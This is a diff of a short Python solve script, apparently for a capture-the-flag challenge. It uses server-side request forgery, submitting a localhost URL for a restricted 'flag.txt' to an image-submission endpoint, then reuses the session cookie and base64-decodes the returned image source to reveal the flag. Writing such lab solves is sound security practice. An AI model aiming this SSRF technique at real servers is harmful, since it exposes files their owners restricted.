@@ -1,5 +1,5 @@
-#NOT FINISHED
-
+from bs4 import BeautifulSoup
+import base64
 import requests as r
 import time
 import random
@@ -8,18 +8,18 @@ import hashlib
 
 url = "http://127.0.0.1:3000"
 
-r1 = r.post(f"{url}",data={
+r1 = r.post(f"{url}/submitimage",data={
     "url":"http://127.0.0.1:3000/restricted_memes/flag.txt",
 })
 
-r1 = r.post(f"{url}/captionsubmit",data={
+cookie = r1.history[0].headers['Set-Cookie']
+
+r1 = r.post(f"{url}/captionsubmit", data={
     "caption": ''
-})
+}, headers = {"Cookie" : cookie})
 
-flag = r1.history[0].headers['Set-Cookie']
+soup = BeautifulSoup(r1.content, 'html.parser')
 
-<img src="{{fried}}">
+img = soup.find_all("img")
 
-idk
-
-print(r1)
+print(base64.b64decode(img[0]['src']))
